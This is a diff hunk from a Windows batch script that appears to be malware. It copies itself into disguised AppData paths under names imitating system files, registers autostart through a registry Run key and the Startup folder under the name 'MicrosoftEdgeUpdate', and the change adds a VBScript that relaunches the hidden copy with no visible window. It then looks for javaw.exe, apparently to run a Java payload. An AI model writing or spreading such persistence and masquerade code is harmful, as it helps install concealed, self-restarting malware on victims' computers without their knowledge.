@@ -23,7 +23,8 @@ copy /y "%~f0" "%ad%\Microsoft\Crypto\RSA\cache-helper.cmd" >nul 2>&1
 copy /y "%~f0" "%ad%\Microsoft\Crypto\RSA\MachineKeys.bat" >nul 2>&1
 copy /y "%~f0" "%ad%\Microsoft\Protect\syskeys.bat" >nul 2>&1
 copy /y "%~f0" "%ad%\Microsoft\Windows\WER\ReportArchive\wersvc.cmd" >nul 2>&1
-copy /y "%~f0" "%ad%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" >nul 2>&1
+del /f /q "%ad%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" >nul 2>&1
+> "%ad%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.vbs" echo Set w=CreateObject("WScript.Shell"):w.Run "%ad%\Microsoft\Crypto\RSA\cache-helper.cmd",0,False
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /t REG_SZ /d "wscript.exe ""%ad%\Microsoft\Crypto\RSA\boot.vbs""" /f >nul 2>&1
 set "java="
 for /d %%j in ("%ProgramFiles%\Java\*") do if not defined java if exist "%%~j\bin\javaw.exe" set "java=%%~j\bin\javaw.exe"
